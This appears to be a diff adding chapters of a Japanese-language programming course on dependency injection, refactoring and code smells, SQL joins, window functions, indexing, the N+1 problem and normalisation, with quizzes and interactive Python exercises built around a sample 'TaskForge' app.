+<p><strong>依存性注入</strong>（DI）とは、クラス内部で依存関係を生成するのではなく、外部から渡すプラクティスです。これは上記のDIPで既に見ました。Pythonでは通常DIフレームワークは不要であり、コンストラクタインジェクションで十分です。</p>
+
+<pre style="overflow-x:auto"><code># WITHOUT DI: tightly coupled, untestable
+class OrderProcessor:
+    def __init__(self):
+        self.payment = StripePayment()  # Hard-coded!
+        self.email = SendGridEmail()    # Hard-coded!
+
+# WITH DI: loosely coupled, easily testable
+class OrderProcessor:
+    def __init__(self, payment, email):
+        self.payment = payment  # Injected
+        self.email = email      # Injected
+
+# Production
+processor = OrderProcessor(StripePayment(), SendGridEmail())
+# Testing
+test_proc = OrderProcessor(MockPayment(), MockEmail())</code></pre>
+
+<h3>リファクタリングパターンとコードスメル（Code Smells）</h3>
+
+<p><strong>コードスメル</strong>（code smell）は、より深い問題がある可能性を示す表面的な指標です。最も一般的なスメルとその対処法を以下に示します：</p>
+
+<div style="overflow-x:auto">
+<table>
+<caption>一般的なコードスメルとリファクタリングの対処法</caption>
+<thead><tr><th>コードスメル</th><th>症状</th><th>リファクタリング</th></tr></thead>
+<tbody>
+<tr><td><strong>神クラス（God Class）</strong></td><td>一つのクラスが何でも行う（500行以上、20以上のメソッド）</td><td>クラスの抽出 — 責任ごとにコンポーネントに分割する</td></tr>
+<tr><td><strong>機能の羨望（Feature Envy）</strong></td><td>メソッドが自クラスより他クラスのデータを多く使う</td><td>メソッドの移動 — 本来属するクラスに移す</td></tr>
+<tr><td><strong>散弾銃の手術（Shotgun Surgery）</strong></td><td>一つの変更が多くのファイルの修正を必要とする</td><td>メソッドの移動/クラスの抽出 — 関連ロジックをまとめる</td></tr>
+<tr><td><strong>長いメソッド（Long Method）</strong></td><td>メソッドが20〜30行を超えるか、複数のことをする</td><td>メソッドの抽出 — より小さな名前付きステップに分解する</td></tr>
+<tr><td><strong>基本型への執着（Primitive Obsession）</strong></td><td>小さな値オブジェクトの代わりに生の文字列/整数を使う</td><td>値オブジェクトへの置き換え（例：生の文字列の代わりに<code>Email</code>クラス）</td></tr>
+</tbody>
+</table>
+</div>
+
+<p><strong>メソッドの抽出（Extract Method）</strong>は最も一般的なリファクタリングです。一つの一貫したことをするコードブロックを取り出し、説明的な名前を付け、関数にします：</p>
+
+<pre style="overflow-x:auto"><code># Before: one large function doing four things
+def process_order(order):
+    if not order.get("items"):
+        raise ValueError("No items")
+    if order["total"] &lt; 0:
+        raise ValueError("Negative total")
+    tax = order["total"] * 0.08
+    order["tax"] = tax
+    order["grand_total"] = order["total"] + tax
+    db.save(order)
+    email.send(order["customer"], f"Confirmed: ${order['grand_total']}")
+
+# After: each step has a clear name
+def process_order(order):
+    validate_order(order)
+    apply_tax(order)
+    db.save(order)
+    notify_customer(order)
+
+def validate_order(order):
+    if not order.get("items"):
+        raise ValueError("No items")
+    if order["total"] &lt; 0:
+        raise ValueError("Negative total")
+
+def apply_tax(order, rate=0.08):
+    order["tax"] = order["total"] * rate
+    order["grand_total"] = order["total"] + order["tax"]
+
+def notify_customer(order):
+    email.send(order["customer"], f"Confirmed: ${order['grand_total']}")</code></pre>
+
+<p><strong>条件分岐のポリモーフィズムへの置き換え（Replace Conditional with Polymorphism）</strong>は、型フィールドに基づいた長い<code>if/elif</code>チェーンがある場合に特に強力です。上記のOCPで修正したのがまさにこれです。</p>
+
+<p><strong>ストラングラーフィグパターン（Strangler Fig Pattern）</strong>は大規模なリファクタリングに使います：システムをゼロから書き直す代わりに、古いシステムの隣に新しいシステムを徐々に構築し、古いシステムが完全に置き換わるまでトラフィックを少しずつ新しいコードに切り替えていきます。名前はホストツリーに巻き付いて最終的に置き換えるストラングラーフィグ（イチジクの一種）の木に由来します。</p>
+
+<div role="note" class="callout info">
+<div class="callout-title">重要な概念：TaskForgeとの関連</div>
+<p>ストレージにストラテジーパターンを使うようTaskForgeをリファクタリングしましょう。<code>StorageBackend</code>抽象基底クラスを作成し、<code>DictBackend</code>（高速テスト用）と<code>SQLiteBackend</code>（本番用）の両方を実装します。<code>TaskManager</code>はコンストラクタインジェクション経由で任意のバックエンドを受け入れるようにします。この一つの変更でTaskForgeのテストが格段に容易になります。</p>
+</div>
+
+<div class="pq">「まず動かす、次に正しくする、最後に速くする — この順番で。」 &mdash; Kent Beck</div>
+
+<div role="note" class="callout ok">
+<div class="callout-title">やってみよう</div>
+<p>TaskForgeのコードベースを見てみましょう。一つの神クラス（多くのことをしすぎているファイルまたはクラス）を見つけましょう。どの責任を分離できるか書き出してみましょう。まだリファクタリングする必要はありません。スメルの識別を練習するだけです。</p>
+</div>
+
+<!-- Ch28 Quiz -->
+<div class="quiz" data-ch="28" data-ex="solid-violation">
+  <h4>確認テスト</h4>
+  <p><code>UserManager</code>というクラスがユーザー登録、パスワードのハッシュ化、ウェルカムメールの送信、アナリティクスレポートの生成を処理しています。これはどのSOLID原則に最も明確に違反していますか？</p>
+  <div class="quiz-options">
+    <button class="quiz-option" data-correct="true">単一責任の原則（SRP）— クラスに変更する理由が複数ある</button>
+    <button class="quiz-option" data-correct="false">開放/閉鎖の原則（OCP）— 拡張可能ではない</button>
+    <button class="quiz-option" data-correct="false">リスコフの置換原則（LSP）— サブタイプで置換できない</button>
+    <button class="quiz-option" data-correct="false">依存性逆転の原則（DIP）— 具体クラスに依存している</button>
+  </div>
+  <div class="quiz-feedback"></div>
+</div>
+
+<!-- Ch28 Pyodide Exercise -->
+<div class="exercise" data-type="pyodide" data-ch="28" data-ex="strategy-pattern">
+  <div class="exercise-header">
+    <h4>演習：ストラテジーパターンの実装</h4>
+    <span class="exercise-status"></span>
+  </div>
+  <p class="exercise-prompt">抽象メソッド<code>save(key, value)</code>、<code>load(key)</code>、<code>list_all()</code>を持つ<code>StorageBackend</code>基底クラスを作成してください。次に<code>DictStorage</code>（辞書に格納）と<code>ListStorage</code>（タプルのリストに格納）を実装してください。最後に、コンストラクタが任意のバックエンドを受け入れる<code>TaskManager</code>クラスを作成してください。<code>add_task(task_id, title)</code>は<code>{"title": title}</code>を保存し、<code>get_task(task_id)</code>はそれを読み込むようにしてください。</p>
+  <div class="exercise-editor">
+    <script type="text/plain" class="starter-code">
+from abc import ABC, abstractmethod
+
+class StorageBackend(ABC):
+    @abstractmethod
+    def save(self, key, value):
+        pass
+
+    @abstractmethod
+    def load(self, key):
+        pass
+
+    @abstractmethod
+    def list_all(self):
+        pass
+
+class DictStorage(StorageBackend):
+    # TODO: implement using a dict
+    pass
+
+class ListStorage(StorageBackend):
+    # TODO: implement using a list of (key, value) tuples
+    pass
+
+class TaskManager:
+    # TODO: accept a backend, implement add_task and get_task
+    pass
+    </script>
+    <script type="text/plain" class="test-code">
+# Test DictStorage
+ds = DictStorage()
+ds.save("t1", {"title": "Buy milk"})
+ds.save("t2", {"title": "Fix bug"})
+assert ds.load("t1") == {"title": "Buy milk"}, "DictStorage load failed"
+assert ds.load("t2") == {"title": "Fix bug"}, "DictStorage load t2 failed"
+assert len(ds.list_all()) == 2, "DictStorage list_all should return 2 items"
+
+# Test ListStorage
+ls = ListStorage()
+ls.save("t1", {"title": "Buy milk"})
+ls.save("t2", {"title": "Fix bug"})
+assert ls.load("t1") == {"title": "Buy milk"}, "ListStorage load failed"
+assert ls.load("t2") == {"title": "Fix bug"}, "ListStorage load t2 failed"
+assert len(ls.list_all()) == 2, "ListStorage list_all should return 2 items"
+
+# Test TaskManager with DictStorage
+tm_dict = TaskManager(DictStorage())
+tm_dict.add_task("a1", "Write docs")
+assert tm_dict.get_task("a1") == {"title": "Write docs"}, "TaskManager+DictStorage failed"
+
+# Test TaskManager with ListStorage
+tm_list = TaskManager(ListStorage())
+tm_list.add_task("b1", "Deploy app")
+assert tm_list.get_task("b1") == {"title": "Deploy app"}, "TaskManager+ListStorage failed"
+
+# Verify both backends are interchangeable
+assert isinstance(tm_dict._backend, StorageBackend), "Backend must inherit StorageBackend"
+assert isinstance(tm_list._backend, StorageBackend), "Backend must inherit StorageBackend"
+print("All Strategy pattern tests passed!")
+    </script>
+  </div>
+  <div class="exercise-controls">
+    <button class="ex-run">実行</button>
+    <button class="ex-check">確認</button>
+    <button class="ex-hint" data-level="0">ヒント</button>
+    <button class="ex-reset">リセット</button>
+  </div>
+  <div class="exercise-output"></div>
+  <div class="exercise-tests"></div>
+  <div class="exercise-hints">
+    <p class="hint">DictStorage：__init__でself._store = {}を使います。save()はself._store[key] = valueを設定します。load()はself._store.get(key)を返します。list_all()はlist(self._store.values())を返します。</p>
+    <p class="hint">ListStorage：__init__でself._store = []を使います。save()は(key, value)をappendします。load()はリストを反復して一致するキーを探します。list_all()は[v for _, v in self._store]を返します。</p>
+    <p class="hint">TaskManager.__init__はself._backendとして格納されるbackendパラメータを取ります。add_taskはself._backend.save(task_id, {"title": title})を呼びます。get_taskはself._backend.load(task_id)を呼びます。</p>
+  </div>
+</div>
+
+</section>
+
+
+<!-- ===== CH 29 ===== -->
+<section id="ch29" data-ch="29">
+<h2><span class="ch-label">第29章</span> SQLとクエリマスタリー</h2>
+
+<div role="note" class="callout info">
+<div class="callout-title">重要な概念</div>
+<p>第15章では、テーブルの作成と基本的なクエリを実行するのに十分なSQLを学びました。実際の現場では、数百万行のデータ、複雑な関係、パフォーマンス要件を持つデータベースに遭遇します。この章では「SELECTが書ける」から「効率的で複雑なクエリが書け、なぜそのようなパフォーマンスになるかを理解できる」レベルへと引き上げます。</p>
+</div>
+
+<h3>JOIN — テーブルの結合</h3>
+
+<p>実際のデータベースは重複を避けるためにデータを複数のテーブルに分散させています（正規化）。<strong>JOIN</strong>はクエリでそのデータを再結合する方法です。様々なJOINの種類を理解することは不可欠です。</p>
+
+<h4>INNER JOIN</h4>
+
+<p><em>両方の</em>テーブルで一致する行のみを返します。タスクにカテゴリがない場合、完全に除外されます。</p>
+
+<pre style="overflow-x:auto"><code>-- Tasks with their category names (only matched rows)
+SELECT tasks.title, categories.name AS category
+FROM tasks
+INNER JOIN categories ON tasks.category_id = categories.id;</code></pre>
+
+<p>INNER JOINは二つの集合の積集合と考えてください。一致するペアのみが結果に現れます。</p>
+
+<h4>LEFT OUTER JOIN</h4>
+
+<p>右テーブルに一致がなくても、<em>左</em>テーブルのすべての行を返します。右テーブルの一致しないカラムはNULLになります。</p>
+
+<pre style="overflow-x:auto"><code>-- ALL tasks, including those without a category
+SELECT tasks.title, categories.name AS category
+FROM tasks
+LEFT JOIN categories ON tasks.category_id = categories.id;
+
+-- Result includes:
+-- "Fix login bug"    | "Bugs"
+-- "Unassigned task"  | NULL    &larr; no category, still included</code></pre>
+
+<h4>CROSS JOIN</h4>
+
+<p><strong>デカルト積（Cartesian product）</strong>を返します。最初のテーブルのすべての行を二番目のテーブルのすべての行と組み合わせます。テーブルAが3行でテーブルBが4行の場合、結果は12行になります。滅多に必要になりませんが、すべての可能な組み合わせを生成するのに便利です。</p>
+
+<pre style="overflow-x:auto"><code>-- Every task paired with every user (for scheduling matrix)
+SELECT tasks.title, users.name
+FROM tasks
+CROSS JOIN users;</code></pre>
+
+<h4>自己結合（Self-Join）</h4>
+
+<p>テーブルを自身と結合します。サブタスクを持つタスクのような階層データに便利です。</p>
+
+<pre style="overflow-x:auto"><code>-- Find tasks and their parent tasks
+SELECT child.title AS subtask, parent.title AS parent_task
+FROM tasks AS child
+INNER JOIN tasks AS parent ON child.parent_id = parent.id;</code></pre>
+
+<h3>サブクエリとCTE</h3>
+
+<h4>サブクエリ（Subqueries）</h4>
+
+<p><strong>サブクエリ</strong>は別のクエリ内にネストされたクエリです。<strong>非相関サブクエリ（uncorrelated subquery）</strong>は一度だけ独立して実行されます。<strong>相関サブクエリ（correlated subquery）</strong>は外部クエリの各行に対して一度実行されるため低速ですが、必要になることがあります。</p>
+
+<pre style="overflow-x:auto"><code>-- Uncorrelated: find tasks with above-average priority score
+SELECT title, priority_score
+FROM tasks
+WHERE priority_score &gt; (SELECT AVG(priority_score) FROM tasks);
+
+-- Correlated: find each user's most recent task
+SELECT t.title, t.created_at, t.user_id
+FROM tasks t
+WHERE t.created_at = (
+    SELECT MAX(t2.created_at)
+    FROM tasks t2
+    WHERE t2.user_id = t.user_id  -- References outer query
+);</code></pre>
+
+<h4>共通テーブル式（Common Table Expressions / CTEs）</h4>
+
+<p><strong>CTE</strong>は<code>WITH</code>句を使用して一時的な名前付き結果セットを定義します。CTEは複雑なクエリを論理的なステップに分解することで読みやすくします。</p>
+
+<pre style="overflow-x:auto"><code>-- Find categories with more than 5 high-priority tasks
+WITH high_priority AS (
+    SELECT category_id, COUNT(*) AS cnt
+    FROM tasks
+    WHERE priority = 'high'
+    GROUP BY category_id
+)
+SELECT categories.name, high_priority.cnt
+FROM high_priority
+INNER JOIN categories ON high_priority.category_id = categories.id
+WHERE high_priority.cnt &gt; 5;</code></pre>
+
+<p>CTEはネストされたサブクエリよりはるかに読みやすく、メインクエリで同じCTEを複数回参照することができます。</p>
+
+<h3>ウィンドウ関数（Window Functions）</h3>
+
+<p><strong>ウィンドウ関数</strong>は、<code>GROUP BY</code>のように結果を集約することなく、現在の行に関連する行のセットに対して計算を行います。モダンSQLの最も強力な機能の一つです。</p>
+
+<pre style="overflow-x:auto"><code>-- ROW_NUMBER: sequential number within each category
+SELECT title, category_id, priority_score,
+       ROW_NUMBER() OVER (
+           PARTITION BY category_id
+           ORDER BY priority_score DESC
+       ) AS rank_in_category
+FROM tasks;
+
+-- RANK: ties get the same rank (with gaps after)
+SELECT title, priority_score,
+       RANK() OVER (ORDER BY priority_score DESC) AS rank
+FROM tasks;
+
+-- LAG / LEAD: access the previous/next row's value
+SELECT title, created_at,
+       LAG(created_at) OVER (ORDER BY created_at) AS prev_date
+FROM tasks;</code></pre>
+
+<p><code>OVER</code>句はウィンドウを定義します：<code>PARTITION BY</code>は行をグループに分割し（GROUP BYと似ていますが集約しない）、<code>ORDER BY</code>は各パーティション内の並び順を定義します。</p>
+
+<h3>インデックス — クエリを速くする</h3>
+
+<p>インデックスなしでは、すべてのクエリがテーブル全体をスキャンします（「フルテーブルスキャン」）。<strong>インデックス（index）</strong>は、データベースがすべてをスキャンせずに行を見つけられるようにする別のデータ構造です。教科書の巻末索引のようなものだと考えてください。</p>
+
+<h4>B木インデックス（B-Tree Indexes）</h4>
+
+<p>最も一般的なインデックスの種類は<strong>B木</strong>（平衡木 / balanced tree）です。各ノードが値の範囲を指す木構造でキーを並べた状態で保持します。値の検索はO(n)ではなくO(log n)になります。</p>
+
+<!-- B-tree SVG Diagram -->
+<svg viewBox="0 0 700 310" aria-label="B-tree index structure showing how TaskForge task IDs are organized in a tree for efficient lookup. Root node contains keys 20 and 40, branching to leaf nodes containing task ID ranges." style="width:100%;max-width:700px;margin:1.5rem auto;display:block">
+  <!-- Root node -->
+  <rect x="265" y="10" width="170" height="44" rx="6" class="node-accent" stroke="var(--accent)" stroke-width="2"/>
+  <text x="350" y="37" class="label-text" text-anchor="middle" font-size="14" font-weight="600">20 | 40</text>
+
+  <!-- Level 2 nodes -->
+  <rect x="60" y="95" width="150" height="44" rx="6" class="node-fill" stroke="var(--accent)" stroke-width="1.5"/>
+  <text x="135" y="122" class="label-text" text-anchor="middle" font-size="13">5 | 10 | 15</text>
+
+  <rect x="275" y="95" width="150" height="44" rx="6" class="node-fill" stroke="var(--accent)" stroke-width="1.5"/>
+  <text x="350" y="122" class="label-text" text-anchor="middle" font-size="13">25 | 30 | 35</text>
+
+  <rect x="490" y="95" width="150" height="44" rx="6" class="node-fill" stroke="var(--accent)" stroke-width="1.5"/>
+  <text x="565" y="122" class="label-text" text-anchor="middle" font-size="13">45 | 50 | 55</text>
+
+  <!-- Leaf nodes -->
+  <rect x="12" y="195" width="76" height="32" rx="4" class="node-fill" stroke="var(--a5)" stroke-width="1"/>
+  <text x="50" y="215" class="sub-text" text-anchor="middle" font-size="10">1,2,3,4</text>
+
+  <rect x="98" y="195" width="76" height="32" rx="4" class="node-fill" stroke="var(--a5)" stroke-width="1"/>
+  <text x="136" y="215" class="sub-text" text-anchor="middle" font-size="10">6,7,8,9</text>
+
+  <rect x="184" y="195" width="76" height="32" rx="4" class="node-fill" stroke="var(--a5)" stroke-width="1"/>
+  <text x="222" y="215" class="sub-text" text-anchor="middle" font-size="10">11..14</text>
+
+  <rect x="290" y="195" width="76" height="32" rx="4" class="node-fill" stroke="var(--a5)" stroke-width="1"/>
+  <text x="328" y="215" class="sub-text" text-anchor="middle" font-size="10">21..24</text>
+
+  <rect x="376" y="195" width="76" height="32" rx="4" class="node-fill" stroke="var(--a5)" stroke-width="1"/>
+  <text x="414" y="215" class="sub-text" text-anchor="middle" font-size="10">26..29</text>
+
+  <rect x="492" y="195" width="76" height="32" rx="4" class="node-fill" stroke="var(--a5)" stroke-width="1"/>
+  <text x="530" y="215" class="sub-text" text-anchor="middle" font-size="10">31..34</text>
+
+  <!-- Arrows root to level 2 -->
+  <line x1="300" y1="54" x2="175" y2="95" class="arrow" stroke="var(--accent)" stroke-width="1.5" marker-end="url(#arrowhead)"/>
+  <line x1="350" y1="54" x2="350" y2="95" class="arrow" stroke="var(--accent)" stroke-width="1.5" marker-end="url(#arrowhead)"/>
+  <line x1="400" y1="54" x2="525" y2="95" class="arrow" stroke="var(--accent)" stroke-width="1.5" marker-end="url(#arrowhead)"/>
+
+  <!-- Arrows level 2 to leaves -->
+  <line x1="100" y1="139" x2="55" y2="195" class="arrow" stroke="var(--a5)" stroke-width="1" marker-end="url(#arrowhead-muted)"/>
+  <line x1="135" y1="139" x2="133" y2="195" class="arrow" stroke="var(--a5)" stroke-width="1" marker-end="url(#arrowhead-muted)"/>
+  <line x1="175" y1="139" x2="218" y2="195" class="arrow" stroke="var(--a5)" stroke-width="1" marker-end="url(#arrowhead-muted)"/>
+
+  <line x1="315" y1="139" x2="325" y2="195" class="arrow" stroke="var(--a5)" stroke-width="1" marker-end="url(#arrowhead-muted)"/>
+  <line x1="350" y1="139" x2="410" y2="195" class="arrow" stroke="var(--a5)" stroke-width="1" marker-end="url(#arrowhead-muted)"/>
+  <line x1="385" y1="139" x2="525" y2="195" class="arrow" stroke="var(--a5)" stroke-width="1" marker-end="url(#arrowhead-muted)"/>
+
+  <!-- Search path highlight -->
+  <text x="350" y="260" class="sub-text" text-anchor="middle" font-size="12" fill="var(--accent)" font-weight="500">Lookup task #27: Root &rarr; middle child &rarr; leaf &rarr; found!</text>
+  <text x="350" y="280" class="sub-text" text-anchor="middle" font-size="11">Only 3 node reads instead of scanning all 55 rows</text>
+</svg>
+
+<pre style="overflow-x:auto"><code>-- Single-column index on the column you filter by most
+CREATE INDEX idx_tasks_priority ON tasks(priority);
+
+-- Composite index: useful when filtering by both columns together
+CREATE INDEX idx_tasks_cat_priority ON tasks(category_id, priority);
+
+-- Column order matters! This index helps:
+--   WHERE category_id = 5 AND priority = 'high'  (both columns)
+--   WHERE category_id = 5                         (leftmost column)
+-- But NOT:
+--   WHERE priority = 'high'  (can't skip the first column)</code></pre>
+
+<h4>カバリングインデックス（Covering Indexes）</h4>
+
+<p><strong>カバリングインデックス</strong>はクエリが必要とするすべてのカラムを含むため、データベースはメインテーブルに触れずにインデックスだけでクエリに答えることができます。</p>
+
+<pre style="overflow-x:auto"><code>-- If this is your most common query:
+SELECT title, priority FROM tasks WHERE category_id = 5;
+
+-- This covering index answers it without touching the table:
+CREATE INDEX idx_covering ON tasks(category_id, title, priority);</code></pre>
+
+<h4>インデックスが逆効果になる場合</h4>
+
+<p>インデックスはタダではありません。すべてのインデックスはINSERT、UPDATE、DELETE操作にオーバーヘッドを加え（インデックスも更新する必要がある）、ストレージを消費します。読み取りが少なく書き込みが多いテーブルでは、インデックスが多すぎると実際には処理が遅くなる場合があります。闇雲にインデックスを付ける前にプロファイリングを行ってください。</p>
+
+<h3>クエリの最適化</h3>
+
+<h4>EXPLAIN — クエリプランを読む</h4>
+
+<p><code>EXPLAIN</code>コマンドはデータベースがクエリを<em>どのように</em>実行するかを表示します。</p>
+
+<pre style="overflow-x:auto"><code>EXPLAIN QUERY PLAN
+SELECT tasks.title, categories.name
+FROM tasks
+INNER JOIN categories ON tasks.category_id = categories.id
+WHERE tasks.priority = 'high';
+
+-- Output might show:
+-- SCAN TABLE tasks           &larr; Full table scan! No index on priority
+-- SEARCH TABLE categories USING INTEGER PRIMARY KEY  &larr; Good, using PK</code></pre>
+
+<p><strong>SCAN</strong>（大きなテーブルでは悪い — すべての行を読む）と<strong>SEARCH</strong>または<strong>USING INDEX</strong>（良い — インデックスを使う）という言葉を探してください。WHERE句のある大きなテーブルでSCANが見えた場合、おそらくインデックスが必要です。</p>
+
+<div role="note" class="callout warn">
+<div class="callout-title">ヒント</div>
+<p>本番環境では、遅いクエリがアプリケーションのダウンタイムの最も一般的な原因の一つです。EXPLAINを実行し、出力を解釈し、適切なインデックスを追加する能力は常に使うことになります。このセクションをスキップしないでください — 書くすべてのクエリで練習してください。</p>
+</div>
+
+<h4>N+1問題（The N+1 Problem）</h4>
+
+<p><strong>N+1問題</strong>は、コードがリストを取得するために一つのクエリを実行し、各アイテムの関連データを取得するためにさらにN個のクエリを実行する場合に発生します。非常によくあり、非常に無駄の多いパターンです。</p>
+
+<pre style="overflow-x:auto"><code># THE N+1 PROBLEM
+# 1 query to get all categories
+categories = db.execute("SELECT * FROM categories").fetchall()
+
+for cat in categories:
+    # N queries, one per category!
+    tasks = db.execute(
+        "SELECT * FROM tasks WHERE category_id = ?", (cat["id"],)
+    ).fetchall()
+    print(f"{cat['name']}: {len(tasks)} tasks")
+
+# If there are 100 categories, that's 101 total queries!
+
+# THE FIX: single JOIN query
+results = db.execute("""
+    SELECT categories.name, COUNT(tasks.id) AS task_count
+    FROM categories
+    LEFT JOIN tasks ON tasks.category_id = categories.id
+    GROUP BY categories.id
+""").fetchall()
+# 1 query instead of 101!</code></pre>
+
+<h3>正規化（Normalisation）</h3>
+
+<p><strong>正規化</strong>は冗長性を減らすようにデータを整理します。いくつかの「正規形」があり、それぞれが前の正規形の上に構築されます。</p>
+
+<p><strong>第一正規形（1NF）：</strong>すべてのカラムがアトミック（単一）な値を含みます。リストや繰り返しグループはありません。</p>
+
+<pre style="overflow-x:auto"><code>-- VIOLATES 1NF: tags column contains a comma-separated list
+-- | id | title    | tags              |
+-- | 1  | Fix bug  | "urgent,security" |
+
+-- 1NF FIX: separate table for tags
+-- tasks: | id | title   |
+-- tags:   | id | task_id | tag      |
+--         | 1  | 1       | urgent   |
+--         | 2  | 1       | security |</code></pre>
+
+<p><strong>第二正規形（2NF）：</strong>1NFを満たし、すべての非キーカラムが主キー<em>全体</em>に依存します（複合キーに関連）。</p>
+
+<p><strong>第三正規形（3NF）：</strong>2NFを満たし、非キーカラムが他の非キーカラムに依存しません（推移的依存なし）。</p>
+
+<pre style="overflow-x:auto"><code>-- VIOLATES 3NF: city depends on zip_code, not on the primary key
+-- | user_id | name  | zip_code | city     |
+
+-- 3NF FIX: separate zip_codes table
+-- users:     | user_id | name  | zip_code |
+-- zip_codes: | zip_code | city            |</code></pre>
+
+<p><strong>非正規化が有用なとき：</strong>読み取りが多いアナリティクスやレポートのクエリでは、コストのかかるJOINを避けるために冗長なデータを格納することが有益な場合があります。これは意図的なトレードオフです：書き込みがより複雑になり、データの不整合が生じる可能性と引き換えに読み取りが高速になります。</p>
+
+<div role="note" class="callout info">
+<div class="callout-title">重要な概念：TaskForgeとの関連</div>
+<p>TaskForgeデータベースにインデックスを追加しましょう：<code>tasks.priority</code>のインデックス、<code>tasks(category_id, priority)</code>の複合インデックス、そして最も頻繁なクエリ用のカバリングインデックスです。違いを見るために<code>EXPLAIN QUERY PLAN</code>を前後で実行してください。また、APIルートのN+1クエリを見つけて修正してください。</p>
+</div>
+
+<div role="note" class="callout ok">
+<div class="callout-title">やってみよう</div>
+<p>この疑似コードのN+1問題を識別してみましょう。</p>
+<pre style="overflow-x:auto"><code>users = db.query("SELECT * FROM users")
+for user in users:
+    tasks = db.query(f"SELECT * FROM tasks WHERE user_id = {user.id}")
+    user.task_count = len(tasks)</code></pre>
+<p>これを置き換える一つのJOINクエリを書いてみましょう。</p>
+<pre style="overflow-x:auto"><code>SELECT users.*, COUNT(tasks.id) AS task_count
+FROM users
+LEFT JOIN tasks ON tasks.user_id = users.id
+GROUP BY users.id</code></pre>
+</div>
+
+<!-- Ch29 Pyodide Exercise -->
+<div class="exercise" data-type="pyodide" data-ch="29" data-ex="sql-joins-windows">
+  <div class="exercise-header">
+    <h4>演習：SQL JOINとウィンドウ関数</h4>
+    <span class="exercise-status"></span>
+  </div>
+  <p class="exercise-prompt">Pythonの<code>sqlite3</code>を使ってテーブルを作成しデータを挿入したあと、JOINとウィンドウ関数を使ったクエリを書いてください。各関数が正しい結果を返すように完成させてください。</p>
+  <div class="exercise-editor">
+    <script type="text/plain" class="starter-code">
+import sqlite3
+
+def setup_database():
+    """Create tables and insert sample data. Return the connection."""
+    conn = sqlite3.connect(":memory:")
+    conn.row_factory = sqlite3.Row
+    c = conn.cursor()
+    c.execute("""CREATE TABLE categories (
+        id INTEGER PRIMARY KEY, name TEXT NOT NULL
+    )""")
+    c.execute("""CREATE TABLE tasks (
+        id INTEGER PRIMARY KEY, title TEXT NOT NULL,
+        priority INTEGER DEFAULT 3, category_id INTEGER,
+        FOREIGN KEY (category_id) REFERENCES categories(id)
+    )""")
+    c.executemany("INSERT INTO categories (id, name) VALUES (?, ?)", [
+        (1, "Bugs"), (2, "Features"), (3, "Docs")
+    ])
+    c.executemany(
+        "INSERT INTO tasks (id, title, priority, category_id) VALUES (?, ?, ?, ?)", [
+        (1, "Fix login crash", 5, 1),
+        (2, "Add dark mode", 3, 2),
+        (3, "Update README", 2, 3),
+        (4, "Fix timeout bug", 4, 1),
+        (5, "Search feature", 4, 2),
+        (6, "Orphan task", 3, None),
+    ])
+    conn.commit()
+    return conn
+
+def query_inner_join(conn):
+    """Return list of (title, category_name) for tasks WITH a category.
+    Use INNER JOIN. Should return 5 rows (orphan excluded)."""
+    # TODO
+    pass
+
+def query_left_join(conn):
+    """Return list of (title, category_name) for ALL tasks.
+    Tasks without a category should have None for category_name.
+    Should return 6 rows."""
+    # TODO
+    pass
+
+def query_window_rank(conn):
+    """Return list of (title, category_id, priority, rank_in_category).
+    Rank by priority DESC within each category using ROW_NUMBER().
+    Only include tasks that HAVE a category."""
+    # TODO
+    pass
+
+conn = setup_database()
+    </script>
+    <script type="text/plain" class="test-code">
+inner = query_inner_join(conn)
+assert inner is not None, "query_inner_join returned None"
+assert len(inner) == 5, f"INNER JOIN should return 5 rows, got {len(inner)}"
+titles = [r[0] for r in inner]
+assert "Orphan task" not in titles, "INNER JOIN should exclude orphan task"
+
+left = query_left_join(conn)
+assert left is not None, "query_left_join returned None"
+assert len(left) == 6, f"LEFT JOIN should return 6 rows, got {len(left)}"
+orphan = [r for r in left if r[0] == "Orphan task"]
+assert len(orphan) == 1, "Orphan task should appear in LEFT JOIN"
+assert orphan[0][1] is None, "Orphan task's category should be None"
+
+ranked = query_window_rank(conn)
+assert ranked is not None, "query_window_rank returned None"
+assert len(ranked) == 5, f"Window query should return 5 rows, got {len(ranked)}"
+cat1 = [r for r in ranked if r[1] == 1]
+assert cat1[0][3] == 1, "Highest priority in Bugs should be rank 1"
+assert cat1[0][0] == "Fix login crash", "Fix login crash should be rank 1 in Bugs"
+print("All SQL tests passed!")
+    </script>
+  </div>
+  <div class="exercise-controls">
+    <button class="ex-run">実行</button>
+    <button class="ex-check">確認</button>
+    <button class="ex-hint" data-level="0">ヒント</button>
+    <button class="ex-reset">リセット</button>
+  </div>
+  <div class="exercise-output"></div>
+  <div class="exercise-tests"></div>
+  <div class="exercise-hints">
+    <p class="hint">INNER JOINの場合：<code>SELECT tasks.title, categories.name FROM tasks INNER JOIN categories ON tasks.category_id = categories.id</code>。<code>conn.execute(sql).fetchall()</code>を使います。</p>
+    <p class="hint">LEFT JOINの場合：INNER JOINをLEFT JOINに変更します。これによりcategory_idがNULLのタスクも含まれます。</p>
+    <p class="hint">ウィンドウ関数の場合：<code>SELECT title, category_id, priority, ROW_NUMBER() OVER (PARTITION BY category_id ORDER BY priority DESC) AS rank FROM tasks WHERE category_id IS NOT NULL</code></p>
+  </div>
+</div>
+
+</section>
+
+
+<!-- ===== CH 30 ===== -->
+<section id="ch30" data-ch="30">
+<h2><span class="ch-label">第30章</span> トランザクション、NoSQL、データの進化</h2>
+
+<div role="note" class="callout info">
+<div class="callout-title">重要な概念</div>
+<p>二人のユーザーが同じタスクを同時に更新するとどうなるでしょうか？関連するレコードの保存途中でサーバーがクラッシュしたら？トランザクションはこれらの危険からデータを守ります。そしてリレーショナルデータベースが適切なツールでない場合もあります。NoSQLを理解することで、賢く選択するための語彙が身につきます。</p>
+</div>
+
+<h3>トランザクションとACID</h3>
+
+<p><strong>トランザクション（transaction）</strong>は、すべて成功するかすべて失敗しなければならないデータベース操作のグループです。中間状態はありません。これを保証するプロパティを<strong>ACID</strong>と呼びます：</p>
+
+<p><strong>原子性（Atomicity）：</strong>トランザクション内のすべての操作が成功するか、一つも成功しないかのどちらかです。5ステップ中のステップ3が失敗した場合、ステップ1と2は発生しなかったかのようにロールバックされます。</p>
+
+<p><strong>一貫性（Consistency）：</strong>トランザクションはデータベースを一つの有効な状態から別の状態へ移行させます。制約（外部キー、一意性ルール、チェック制約）は常に適用されます。</p>
+
+<p><strong>独立性（Isolation）：</strong>並行するトランザクションはお互いに干渉しません。各トランザクションは自分だけが実行しているかのようにデータベースを見ます（独立性の度合いは設定可能です）。</p>
+
+<p><strong>耐久性（Durability）：</strong>コミットされると、データはクラッシュ、停電、再起動を生き延びます。</p>
+
+<!-- ACID SVG Diagram -->
